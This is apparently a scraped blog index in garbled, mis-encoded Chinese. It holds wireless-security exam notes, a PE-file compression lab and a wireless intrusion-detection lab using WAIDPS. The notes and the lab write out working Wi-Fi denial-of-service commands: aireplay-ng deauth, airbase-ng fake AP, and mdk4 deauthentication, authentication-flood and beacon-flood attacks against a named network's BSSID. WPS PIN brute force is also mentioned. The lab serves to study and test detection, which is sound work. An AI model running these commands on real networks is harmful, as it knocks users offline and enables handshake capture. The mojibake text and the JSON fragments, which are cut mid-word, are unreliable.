åªæ”¯æŒåŒå‘é“¾è·¯ï¼Œä¸æ”¯æŒå•å‘ DSDVã€AODVã€DSRä¸‰ç§åè®®äº†è§£ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå±äºä»€ä¹ˆåˆ†ç±»ã€‚å“ªäº›æ”¯æŒå•å‘é“¾è·¯ï¼Œå“ªäº›ä¸æ”¯æŒå•å‘é“¾è·¯ã€‚ è¡¨é©±åŠ¨è·¯ç”±ã€‚ã€‚ å¯†é’¥ç®¡ç†çš„æ–¹æ¡ˆ å®Œå…¨åˆ†å¸ƒå¼çš„è§£å†³æ–¹æ¡ˆ èŠ‚ç‚¹ç”Ÿæˆå…¶å¯†é’¥ï¼Œå‘è¡Œã€å­˜å‚¨å’Œåˆ†å‘å…¬é’¥è¯ä¹¦ã€‚ æ¯ä¸ªèŠ‚ç‚¹åŒ…å«æœ¬åœ°è¯ä¹¦å­˜å‚¨åº“ï¼Œè¯¥æ•°æ®åº“åŒ…å«æœ‰é™æ•°é‡çš„è¯ä¹¦ã€‚ å½“èŠ‚ç‚¹uæƒ³è¦éªŒè¯èŠ‚ç‚¹vçš„å…¬é’¥çš„çœŸä¼ªæ—¶ï¼Œè¿™ä¸¤ä¸ªèŠ‚ç‚¹åˆå¹¶ä»–ä»¬çš„æœ¬åœ°è¯ä¹¦å­˜å‚¨åº“ï¼Œç„¶åèŠ‚ç‚¹uä¼šè¯•å›¾åœ¨è¿™ä¸ªåˆå¹¶çš„åº“ä¸­æ‰¾åˆ°ä¸€ä¸ªä»è‡ªå·±åˆ°vçš„åˆé€‚çš„è¯ä¹¦é“¾ã€‚ å»ºç«‹å…¬å…±å¯†é’¥ï¼šæ¯ä¸ªèŠ‚ç‚¹çš„å…¬é’¥å’Œå¯¹åº”çš„ç§é’¥æ˜¯åœ¨æœ¬åœ°èŠ‚ç‚¹æœ¬èº«åˆ›å»ºçš„ ç­¾å‘å…¬é’¥è¯ä¹¦ï¼šå¦‚æœä¸€ä¸ªèŠ‚ç‚¹uä¿¡ä»»ä¸€ä¸ªç»™å®šçš„å…¬å…±å¯†é’¥K_vï¼Œå¹¶ä¸”K_vå±äºç»™å®šçš„èŠ‚ç‚¹vï¼Œé‚£ä¹ˆuå¯ä»¥ç­¾å‘ä¸€ä¸ªå…¬é’¥è¯ä¹¦ï¼Œåœ¨è¯¥è¯ä¹¦ä¸­K_vä»¥uçš„ç­¾åç»‘å®šåˆ°vã€‚ è¯ä¹¦çš„å­˜å‚¨ï¼šæ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤æœ¬åœ°çš„è¯ä¹¦åº“ï¼Œä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼š é¦–å…ˆï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨å®ƒè‡ªå·±ç­¾å‘çš„è¯ä¹¦ã€‚ å…¶æ¬¡ï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨ä¸€ç»„é¢å¤–çš„è¯ä¹¦ï¼ˆç”±å…¶ä»–èŠ‚ç‚¹ç­¾å‘ï¼‰ã€‚ éƒ¨åˆ†åˆ†å¸ƒå¼çš„è§£å†³æ–¹æ¡ˆ ä½¿ç”¨é—¨é™å¯†ç éƒ¨ç½²CAï¼Œæ ¹æ®èŠ‚ç‚¹çš„å®‰å…¨æ€§å’Œç‰©ç†ç‰¹æ€§ä¸Šçš„åŠŸèƒ½ç‰¹åˆ«çš„é€‰æ‹©èŠ‚ç‚¹ è¿™äº›è¢«é€‰æ‹©çš„èŠ‚ç‚¹å…±åŒæä¾›PKIåŠŸèƒ½ï¼Œè¢«ç§°ä¸ºMOCAï¼ˆmobile certificate authorityï¼Œç§»åŠ¨æ­£å¼é¢å‘æœºæ„ï¼‰ã€‚ ä¸€ä¸ªå®¢æˆ·ç«¯å’Œå¤šä¸ªMOCAæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ ä¸€ä¸ªå®¢æˆ·ç«¯è‡³å°‘è”ç³»kä¸ªMOCAï¼Œä»¥åŠæ¥æ”¶è‡³å°‘kä¸ªå›å¤ã€‚ è®¤è¯æœåŠ¡çš„å®¢æˆ·ç«¯éœ€è¦å‘é€è®¤è¯è¯·æ±‚ï¼ˆCREQï¼‰æ•°æ®åŒ…ï¼Œä»»ä½•æ”¶åˆ°CREQçš„MOCAéƒ½è¦ä»¥è®¤è¯å›å¤ï¼ˆCREPï¼‰æ•°æ®åŒ…ä½œä¸ºå“åº”ã€‚ CREPä¸­åŒ…å«å…¶éƒ¨åˆ†ç­¾åï¼Œå®¢æˆ·ç«¯ä¸ºäº†å¾—åˆ°kä¸ªCREPï¼Œç­‰å¾…ä¸€æ®µå›ºå®šæ—¶é—´ï¼Œå½“å®¢æˆ·ç«¯æ”¶é›†kä¸ªé€‚ç”¨çš„CREPæ—¶ï¼Œå®ƒå¯ä»¥é‡å»ºå®Œæ•´çš„ç­¾åå¹¶ä¸”è®¤è¯è¯·æ±‚æˆåŠŸã€‚ å¦‚æœæ”¶åˆ°çš„CREPsè¿‡å°‘ï¼Œå®¢æˆ·ç«¯CREQå®šæ—¶å™¨è¶…æ—¶ï¼Œè®¤è¯è¯·æ±‚å¤±è´¥ã€‚ å®Œå…¨åˆ†å¸ƒå¼ï¼ˆæœ¬è´¨ï¼Œåœ¨æœ‰å‘å›¾é‡ŒçŸ¥é“ä¸€ä¸ªå­å›¾ï¼Œæ€ä¹ˆåˆ¤æ–­ä¸¤ä¸ªç‚¹ä¹‹é—´çš„æœ‰å‘é“¾è·¯ï¼‰ã€éƒ¨åˆ†åˆ†å¸ƒå¼ï¼ˆä¼ ç»Ÿçš„åŸºäºPKIï¼Œé‡Œé¢æœ‰kä¸ªcã€‚æŠŠä¸€ä¸ªcå˜æˆå¾ˆå¤šcï¼‰ ç¬¬ä¸ƒç« ç¤¾äº¤ç½‘ç»œçš„ç‰¹ç‚¹ èŠ‚ç‚¹ç§»åŠ¨æ€§è¾ƒå¼ºï¼Œç¤¾äº¤ç½‘ç»œä¸­çš„æ•°æ®åœ¨åŒå±äºä¸€ä¸ªç¤¾åŒºçš„ç”¨æˆ·ä¹‹é—´äº§ç”Ÿï¼Œé€šè¿‡èŠ‚ç‚¹çš„ç§»åŠ¨è€Œä¼ æ’­ã€‚ æ•°æ®çš„åˆ†å‘æ–¹å¼æ˜¯â€œå­˜å‚¨â€”æºå¸¦â€”è½¬å‘â€ï¼Œç«¯åˆ°ç«¯çš„å»¶è¿Ÿè¾ƒå¤§ã€‚ ç”±äºæ²¡æœ‰ç«¯åˆ°ç«¯çš„è¿æ¥ï¼Œæ•°æ®çš„ä¼ é€’ä¸è½¬å‘ä¾èµ–äºç”¨æˆ·ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚ ä¸ä¼ ç»Ÿçš„æ— çº¿ç½‘ç»œç›¸åŒï¼Œç¤¾äº¤ç½‘ç»œçš„èƒ½é‡å’Œç‰©ç†ç©ºé—´ä¹Ÿæ˜¯æœ‰é™çš„ã€‚ è·¯ç”±ç®—æ³•ï¼ˆå››ç§ï¼‰éƒ½æ˜¯ä»€ä¹ˆæ„æ€ ä¼ æŸ“è·¯ç”±(Epidemic Routing)ï¼šåŸºæœ¬åŸç†æ˜¯ä¸­é—´èŠ‚ç‚¹å°†æ•°æ®åŒ…è½¬å‘ç»™æ‰€æœ‰é‡åˆ°çš„èŠ‚ç‚¹ã€‚ä¼ ç»Ÿè·¯ç”±(Traditional Routing)ï¼šæ ¹æ®è·¯ç”±è¡¨é¡¹ä¸ºæ•°æ®åŒ…è¿›è¡Œè·¯ç”±è·¯å¾„é€‰æ‹©ã€‚ç›®å‰é’ˆå¯¹ä¼ ç»Ÿè·¯ç”±ç®—æ³•çš„ä¿¡ä»»æ¨¡å‹æ¯”è¾ƒå¤šã€‚ä¸Šä¸‹æ–‡è·¯ç”±(Context-based Routing)ï¼šæ ¹æ®ä¸€å®šçš„ä¸Šä¸‹æ–‡ä¿¡æ¯å°†æ•°æ®åŒ…è½¬å‘ç»™é‡åˆ°ç›®çš„èŠ‚ç‚¹æ¦‚ç‡è¾ƒå¤§çš„èŠ‚ç‚¹ã€‚æœºä¼šè·¯ç”±(Opportunistic Routing)ï¼šæ ¸å¿ƒæœºåˆ¶åœ¨äºç›‘å¬å’Œåˆä½œã€‚é¦–å…ˆå°†æ•°æ®å¹¿æ’­ç»™å…¶é€šä¿¡èŒƒå›´å†…çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œç„¶ååˆ©ç”¨èŠ‚ç‚¹é—´çš„åˆä½œæœºåˆ¶ï¼Œé€‰æ‹©ä¸€éƒ¨åˆ†èŠ‚ç‚¹æ¥æ”¶æ•°æ®è¿›è¡ŒæœåŠ¡ã€‚ éšç§ä¿æŠ¤ï¼Œå›¾é‡Œé¢ï¼Œä¸‰ä¸ªå¤§ç±»ï¼ˆè¾¹ã€ç»“ç‚¹ã€å›¾ï¼‰ ç”¨å›¾æ¥è¡¨ç¤ºç¤¾äº¤ç½‘ç»œæ˜¯ä¸€ç§éå¸¸ç›´è§‚å’Œå½¢è±¡çš„æ–¹æ³•ï¼Œç¤¾äº¤ç½‘ç»œå›¾åŒ…å«èŠ‚ç‚¹å’Œè¾¹ï¼ŒèŠ‚ç‚¹ä»£è¡¨ç”¨æˆ·ï¼Œè¾¹ä»£è¡¨ç”¨æˆ·ä¹‹é—´çš„å…³ç³»ã€‚ å®éªŒæ— çº¿ç½‘å¡çš„å·¥ä½œæ¨¡å¼ç®¡ç†æ¨¡å¼ï¼ˆManagedï¼‰ ç”¨äºæ— çº¿STAç›´æ¥ä¸æ— çº¿APè¿›è¡Œæ¥å…¥è¿æ¥ ä¸»æ¨¡å¼ï¼ˆMasterï¼‰ å…è®¸æ— çº¿ç½‘å¡ä½¿ç”¨ç‰¹åˆ¶çš„é©±åŠ¨ç¨‹åºå’Œè½¯ä»¶å·¥ä½œï¼Œä½œä¸ºå…¶ä»–è®¾å¤‡çš„æ— çº¿APã€‚ Ad_Hocæ¨¡å¼ ç”¨æˆ·çš„ç½‘ç»œç”±äº’ç›¸ç›´è¿çš„è®¾å¤‡ç»„æˆæ—¶ä½¿ç”¨ã€‚å„è®¾å¤‡ä¹‹é—´å¯¹ç­‰ç½‘ç»œçš„æ–¹å¼è¿æ¥ã€‚ï¼ˆæ‹¿äº†ç½‘çº¿æ—¶ï¼‰ ç›‘å¬æ¨¡å¼ï¼ˆMonitorï¼‰ ç›‘æ§æ— çº¿ç½‘ç»œå†…éƒ¨çš„æµé‡ã€‚ 1airmon-ng check killairmon-ng start wlan0airmon-ng stop wlan0mon å‘èµ·ä¸‰ç§æ”»å‡»çš„åŸç†ã€æµç¨‹airodump-ng ä¾¦å¬æ•°æ®åŒ… aireplay-ng çš„ deauth å¼ºåˆ¶åˆæ³•å®¢æˆ·ç«¯æ‰çº¿ï¼Œæ‰çº¿åå®¢æˆ·ç«¯ä¼šå°è¯•é‡æ–°è¿æ¥APï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿæ¡æ‰‹åŒ…ã€‚ï¼ˆä¸€æ˜¯å¿…é¡»å¤„åœ¨ç›®æ ‡APçš„ä¿¡å·èŒƒå›´å†…ï¼›äºŒæ˜¯å·²æœ‰åˆæ³•å®¢æˆ·ç«¯è¿æ¥è¯¥APã€‚ï¼‰airbase-ng ä¼ªé€ ç›®æ ‡APæ¥æ¬ºéª—å®¢æˆ·ç«¯ä¸å…¶è¿æ¥ï¼Œäº§ç”Ÿæ¡æ‰‹åŒ… Deauthæ”»å‡» å–æ¶ˆè®¤è¯æ´ªæ°´æ”»å‡»De-authentication Flood Attackç®€ç§°Deauthæ”»å‡»ã€‚è¯¥æ”»å‡»æ–¹å¼ä¸»è¦æ˜¯é€šè¿‡ä¼ªé€ APå‘å®¢æˆ·ç«¯å•æ’­åœ°å€å‘é€å–æ¶ˆèº«ä»½éªŒè¯å¸§ï¼Œå°†å®¢æˆ·ç«¯è½¬ä¸ºæœªå…³è”&#x2F;æœªè®¤è¯çš„çŠ¶æ€ã€‚ Deauthæ”»å‡»æµç¨‹ï¼š1.ç¡®å®šå½“å‰æ— çº¿ç½‘ç»œä¸­å®¢æˆ·ç«¯ä¸APå·²ç»å»ºç«‹äº†è¿æ¥ã€‚2.æ”»å‡»è€…å‘æ•´ä¸ªç½‘ç»œå‘é€ä¼ªé€ çš„å–æ¶ˆèº«ä»½è®¤è¯æŠ¥æ–‡ï¼Œä»è€Œé˜»æ–­åˆæ³•ç”¨æˆ·å’ŒAPé—´çš„è¿æ¥ã€‚3.å½“å®¢æˆ·ç«¯æ”¶åˆ°æ”»å‡»è€…å‘é€çš„æŠ¥æ–‡æ—¶ï¼Œä¼šè®¤ä¸ºè¯¥æŠ¥æ–‡æ¥è‡ªAPã€‚æ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°†è¯•å›¾ä¸APé‡æ–°å»ºç«‹è¿æ¥ã€‚4.æ”»å‡»è€…ä»ç„¶ç»§ç»­å‘ä¿¡é“ä¸­å‘é€å–æ¶ˆèº«ä»½è®¤è¯å¸§ï¼Œå°†å¯¼è‡´å®¢æˆ·ç«¯ä¸APå§‹ç»ˆæ— æ³•é‡è¿ï¼Œå³å·²è¿æ¥çš„å®¢æˆ·ç«¯è‡ªè¡Œæ–­å¼€è¿æ¥ã€‚ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; d &lt;test_options&gt; 1d: å®æ–½Deauthæ”»å‡»æ”»å‡»æ¨¡å¼ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤æ— é™åˆ¶ã€‚-cï¼šæŒ‡å®šæ”»å‡»çš„ä¿¡é“ï¼Œé»˜è®¤å°†åœ¨æ‰€æœ‰ä¿¡é“ä¹‹é—´è·³è½¬ï¼Œæ¯3ç§’åˆ‡æ¢ä¸€æ¬¡ã€‚-E:æ”»å‡»æŒ‡å®šESSIDçš„APã€‚ -Bï¼šæ”»å‡»æŒ‡å®šBSSIDçš„APã€‚ è®¤è¯æ´ªæ°´æ”»å‡» APè®¤è¯æ´ªæ°´æ”»å‡»ï¼Œå°±æ˜¯å‘APå‘é€å¤§é‡è™šå‡çš„è¿æ¥è¯·æ±‚ã€‚å½“å‘é€çš„è¯·æ±‚è¶…è¿‡APæ‰€èƒ½æ‰¿å—çš„èŒƒå›´æ—¶ï¼ŒAPå°±ä¼šè‡ªåŠ¨æ–­å¼€ç°æœ‰è¿æ¥ï¼Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œã€‚ è®¤è¯æ´ªæ°´æ”»å‡»å…·ä½“å·¥ä½œæµç¨‹ï¼š1.ç¡®å®šå½“å‰æ— çº¿ç½‘ç»œä¸­ï¼Œå®¢æˆ·ç«¯ä¸APå·²ç»å»ºç«‹äº†è¿æ¥ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ‰€æœ‰æ— çº¿å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚éƒ½ä¼šè¢«APè®°å½•åœ¨è¿æ¥è¡¨ä¸­ã€‚2.æ”»å‡»è€…ä½¿ç”¨ä¸€äº›çœ‹èµ·æ¥åˆæ³•ä½†å…¶å®æ˜¯éšæœºç”Ÿæˆçš„MACåœ°å€æ¥ä¼ªé€ STAã€‚ç„¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥å‘é€å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚åˆ°APã€‚3.æ”»å‡»è€…å¯¹APè¿›è¡ŒæŒç»­ä¸”å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚ï¼Œæœ€ç»ˆå¯¼è‡´APå¤±å»å“åº”ï¼Œä½¿å¾—APçš„è¿æ¥åˆ—è¡¨å‡ºç°é”™è¯¯ã€‚4.ç”±äºAPçš„è¿æ¥è¡¨å‡ºç°é”™è¯¯ï¼Œä½¿å¾—è¿æ¥çš„åˆæ³•å®¢æˆ·ç«¯å¼ºåˆ¶ä¸APæ–­å¼€è¿æ¥ã€‚ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; a &lt;test_options&gt; interface:æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ 1a: å®æ–½èº«ä»½éªŒè¯æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-a: æŒ‡å®šè¦æ”»å‡»çš„ç›®æ ‡APçš„MACåœ°å€ã€‚-mï¼šä½¿ç”¨æœ‰æ•ˆæ•°æ®åº“ä¸­çš„å®¢æˆ·ç«¯MACåœ°å€ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤æ— é™åˆ¶ã€‚ å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡» å‡ä¿¡æ ‡æ”»å‡»ç±»ä¼¼äºä¼ªAPï¼Œå°±æ˜¯å‘æ— çº¿ä¿¡é“ä¸­å‘é€å¤§é‡è™šå‡çš„SSIDæ¥å……æ–¥å®¢æˆ·ç«¯çš„æ— çº¿åˆ—è¡¨ï¼Œé€šè¿‡åˆ›å»ºæ¶æ„æ— çº¿çƒ­ç‚¹ï¼Œå ç”¨ä¿¡é“èµ„æºï¼Œå¹²æ‰°é€šè®¯ã€‚ æµç¨‹ åˆ›å»ºä¸€ä¸ªè™šå‡çš„ESSID ä½¿ç”¨å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»ï¼Œäº§ç”Ÿäº†å¤§é‡çš„Beaconä¿¡å·å¸§ï¼Œæ˜¯éšæœºäº§ç”Ÿçš„ è¯­æ³•æ ¼å¼ 1mdk4 &lt;interface&gt; b &lt;test_options&gt; 1b: å®æ–½å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-nï¼šè‡ªå®šä¹‰ESSIDã€‚-fï¼šè¯»å–ESSIDåˆ—è¡¨æ–‡ä»¶ã€‚-wï¼šé€‰æ‹©å‡ç½‘ç»œåº”å…·æœ‰çš„åŠ å¯†ç±»å‹ï¼Œæœ‰æ•ˆé€‰é¡¹ï¼šn=ä¸åŠ å¯†ï¼Œw=WEPï¼Œ t=TKIPï¼ˆWPAï¼‰ï¼Œa=AESï¼ˆWPA2ï¼‰ã€‚-tï¼š 1=ä»…åˆ›å»ºè‡ªç»„ç»‡ç½‘ç»œ ï¼Œ0=ä»…åˆ›å»ºManagedï¼ˆAPï¼‰ç½‘ç»œã€‚-mï¼šè¯»å–æ•°æ®åº“çš„MACåœ°å€ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤ä¸º50ã€‚-cï¼šè‡ªå®šä¹‰ä¿¡é“ã€‚ æ•è·æ•°æ®åŒ…çš„å‚æ•°æŠ“åˆ°ä¸€ä¸ªåŒ…ï¼Œç ´è§£ä¸äº†ï¼Œå› ä¸ºæ¡æ‰‹åŒ…æ˜¯æ— æ•ˆçš„ï¼Œè¦èƒ½åˆ¤æ–­ä¸€ä¸ªæ¡æ‰‹åŒ…æ˜¯å¦æœ‰æ•ˆï¼ˆåªæœ‰message1ï¼Œ23æ— æ•ˆï¼‰ è¿‡æ»¤èº«ä»½è®¤è¯æ•°æ®åŒ… 1wlan.fc.type_subtype==0X0B//è®¤è¯ç±»å‹æœ‰ä¸¤ç§ï¼Œ0æ˜¯å¼€æ”¾å¼ï¼Œ1æ˜¯å…±äº«å¼ åªæ˜¾ç¤ºBeaconå¸§ 1wlan.fc.type_subtype==0X08 æ‰¾å‡ºä¸å®¢æˆ·ç«¯è¿æ¥çš„AP 1wlan.fc.type_subtype==0X00 è¿‡æ»¤æ¡æ‰‹åŒ… 1eapo","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"æœŸæœ«è€ƒè¯•/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"å‹ç¼©æ‰‹å·¥æ‰“é€ çš„PEæ–‡ä»¶","slug":"å‹ç¼©æ‰‹å·¥æ‰“é€ çš„PEæ–‡ä»¶","date":"2021-06-04T08:20:27.000Z","updated":"2024-11-12T06:59:56.000Z","comments":true,"path":"2021/06/04/å‹ç¼©æ‰‹å·¥æ‰“é€ çš„PEæ–‡ä»¶/","permalink":"https://gryffinbit.top/2021/06/04/%E5%8E%8B%E7%BC%A9%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0%E7%9A%84PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"å‹ç¼©æ‰‹å·¥æ‰“é€ çš„PEæ–‡ä»¶-å‹ç¼©èŠ‚åŒºå‚è€ƒæ•™æhttps://gryffinbit.lanzoui.com/iBgUCprnmpc å®éªŒç›®çš„é€šè¿‡åˆ©ç”¨C32asmï¼Œå¯¹å®éªŒå…­æ‰‹å·¥ç¼–å†™çš„ä¸€ä¸ªWin32å¹³å°ä¸‹çš„PEæ–‡ä»¶è¿›è¡ŒèŠ‚åŒºå‹ç¼©ï¼Œè¿›ä¸€æ­¥ç†Ÿç»ƒæŒæ¡PEæ–‡ä»¶çš„ç»“æ„ã€‚ å®éªŒå†…å®¹å‹ç¼©æ‰‹å·¥æ‰“é€ äº§ç”Ÿçš„PEæ–‡ä»¶ æ‰‹å·¥äº§ç”ŸPE ä½¿ä¹‹å‹ç¼©åä»å¯æ‰§è¡Œå¹¶è¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š å®éªŒè¿‡ç¨‹ä¿®æ”¹å‹ç¼©èŠ‚åŒºåœ¨å†…å­˜ä¸­èŠ‚åŒºå¯¹é½çš„å¤§å°æœ€å°å°±æ˜¯ 0x00001000ï¼Œè€Œåœ¨ç£ç›˜ä¸ŠèŠ‚åŒºå¯¹é½çš„å¤§å°æœ€å°å¯ä»¥æ˜¯0x00000200ô°ºã€‚è€ƒè™‘æ”¹å˜ç£ç›˜ä¸ŠèŠ‚åŒºå¯¹é½çš„å¤§å°ã€‚ ä¿®æ”¹ç£ç›˜å¯¹é½å¤§å°çš„å€¼ï¼Œå³ IMAGE_OPTIONAL_HEADER ä¸­ FileAlignment å­—æ®µçš„å€¼ ä¿®æ”¹èŠ‚è¡¨ä¸­å…³äºç£ç›˜çš„å­—æ®µï¼Œå³ IMAGE_SECTION_HEADER ä¸­çš„ SizeOfRawData å’Œ PointerToRawData ç¼©å‡æ¯ä¸ªèŠ‚åœ¨ç£ç›˜ä¸­å¯¹åº”çš„å¤šä½™çš„0å­—èŠ‚ ç›¸æ¯”ä»¥å‰çš„16kç¼©å°äº†å¾ˆå¤š","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"æ— çº¿å…¥ä¾µæ£€æµ‹","slug":"æ— çº¿å…¥ä¾µæ£€æµ‹","date":"2021-06-03T21:13:34.000Z","updated":"2024-11-12T07:00:00.000Z","comments":true,"path":"2021/06/04/æ— çº¿å…¥ä¾µæ£€æµ‹/","permalink":"https://gryffinbit.top/2021/06/04/%E6%97%A0%E7%BA%BF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/","excerpt":"","text":"æ— çº¿å…¥ä¾µæ£€æµ‹å®éªŒç›®çš„æŒæ¡åœ¨Kaliä¸Šå®‰è£…WAIDPSè½¯ä»¶ã€‚æŒæ¡ä½¿ç”¨WAIDPSè½¯ä»¶è¿›è¡Œä¿¡æ¯æ”¶é›†çš„æ–¹æ³•ã€‚èƒ½å¤Ÿåˆ©ç”¨WAIDPSè½¯ä»¶è¿›è¡Œå…¥ä¾µæ£€æµ‹ã€‚ å®éªŒç¯å¢ƒKaliæ“ä½œç³»ç»ŸåŠç›¸å…³å·¥å…·æ— çº¿ç½‘å¡æ— çº¿AP å®éªŒåŸç†WAIDPSæ˜¯ä¸€ä¸ªPythonç¼–å†™çš„æ— çº¿å…¥ä¾µæ£€æµ‹å·¥å…·ï¼ŒåŸºäºLinuxå¹³å°ï¼Œå®Œå…¨å¼€æºã€‚WAIDPSåˆ©ç”¨æ— çº¿ç½‘å¡å¯ä»¥æ”¶é›†WIFIç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¹¶ä¸”å®ƒå¯ä»¥æ¢æµ‹åŒ…æ‹¬WEP&#x2F;WPA&#x2F;WPSåœ¨å†…çš„æ— çº¿å…¥ä¾µå’Œæ”»å‡»æ–¹å¼ã€‚å½“å‘ç°æ”»å‡»æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºå¹¶è®°å½•åœ¨æ—¥å¿—ä¸­ã€‚ å®éªŒè¿‡ç¨‹å®‰è£…WAIDPS åˆ‡æ¢åˆ°homeç›®å½• 1cd /home ä¸‹è½½waidpsåˆ°æœ¬åœ° 1git clone https://github.com/SYWorks/waidps.git è¾“å…¥lså¯ä»¥çœ‹åˆ°waidpså·²ç»ä¸‹è½½åˆ°äº†æœ¬åœ°ã€‚è¾“å…¥cd waidpsè¿›å…¥å®‰è£…æ–‡ä»¶å¤¹ 123lscd waidpsls èµ‹äºˆwaidps.pyæ‰§è¡Œæƒé™ 1chmod +x waidps.py å®‰è£…è½¯ä»¶ 1sudo ./ waidps.py è‹¥æç¤ºRequired file not found :xtermï¼Œå®‰è£… 1apt-get install xterm è½¯ä»¶æç¤ºéœ€è¦å®‰è£…databaseï¼Œè¾“å…¥yç¡®è®¤ è½¯ä»¶å®‰è£…æˆåŠŸï¼Œæç¤ºæ²¡æœ‰æ£€æµ‹åˆ°æ— çº¿ç½‘å¡ã€‚ åé¢çš„æ­¥éª¤éƒ½éœ€è¦æ’å…¥æ— çº¿ç½‘å¡ ç”¨æ³• 1sudo waidps.py [option] &lt;args&gt; å¯åŠ¨WAIDPSè½¯ä»¶è¿›å…¥è½¯ä»¶ç›®å½• 1cd /.SYWorks/WAIDPS tipï¼šå¦‚æœdatabaseä¸‹è½½å¤±è´¥ï¼Œå¯ä»¥æ‰‹åŠ¨ä¸‹è½½æ”¾å…¥&#x2F;.SYWorks&#x2F;Database&#x2F; https://raw.githubusercontent.com/SYWorks/Database/master/mac-oui.db å¯åŠ¨è½¯ä»¶ 1sudo waidps.py -i wlan0 è½¯ä»¶ä¼šè‡ªåŠ¨æœç´¢æ— çº¿ä¿¡å·ã€‚ æŒ‰å›è½¦ï¼Œè¿›å…¥å‘½ä»¤è¡Œé€‰æ‹©èœå•ï¼Œå¯ä»¥è¿›è¡Œä¸€äº›ä¿¡æ¯ç­›é€‰ã€‚ èœå• ç”¨é€” è¾“å…¥C å¯ä»¥æ›´æ”¹ä¿¡æ¯åˆ·æ–°æ—¶é—´å’ŒIDSçš„çµæ•åº¦ã€‚ è¾“å…¥A è¿›å…¥å®¡è®¡æ¨¡å¼ï¼Œå¯è¿›è¡ŒWPS PINç æš´åŠ›ç ´è§£ã€‚ ä½¿ç”¨WAIDPSè¿›è¡Œå…¥ä¾µæ£€æµ‹ä½¿ç”¨å¦ä¸€å°æœºå™¨æˆ–ä½¿ç”¨å¦å¤–çš„æ— çº¿ç½‘å¡è¿›è¡Œmdk3&#x2F;mdk4è¿›è¡ŒESSIDæš´åŠ›ç ´è§£ï¼Œåœ¨æ”»å‡»åˆ—è¡¨ä¼šæ˜¾ç¤ºâ€œMDK3-Basic Probing &amp; ESSID BruteForce Modeâ€ ç¬¬äºŒä¸ªç½‘å¡ï¼Œæ˜¯wlan1ï¼Œæ‰“å¼€ç›‘å¬æ¨¡å¼ 1airmon-ng start wlan1 é€‰æ‹©æ”»å‡»ç›®æ ‡â€“è¿æ¥åˆ°209ç½‘ç»œçš„å®¢æˆ·ç«¯ å¯¹è¿æ¥209ç½‘ç»œçš„å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯æ´ªæ°´æ”»å‡» 1mdk4 wlan1mon a -a B0:B5:C3:CB:F8:FF -m æ£€æµ‹åˆ°è®¤è¯æ´ªæ°´æ”»å‡» è¿›è¡ŒDeauthæ”»å‡» ï¼ˆè¦é€‰æ‹©æ”»å‡»çš„ä¿¡é“ï¼Œ209çš„ä¿¡é“æ˜¯6ï¼‰ 1mdk4 wlan1mon d -s 120 -c 6 æ£€æµ‹åˆ°Deauthæ”»å‡» è¿›è¡Œå‡ä¿¡æ ‡æ´ªæ°´æ”»å‡» 1mdk4 wlan1mon b -n 209 -t 0 -w w -c 6 -s 80 æ£€æµ‹åˆ°å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡» å®¡è®¡æŒ‰å›è½¦ï¼Œè¿›å…¥å‘½ä»¤è¡Œèœå•ï¼Œè¾“å…¥Aï¼Œè¿›å…¥å®¡è®¡æ¨¡å¼ï¼Œå¯è¿›è¡ŒWPS PINç æš´åŠ›ç 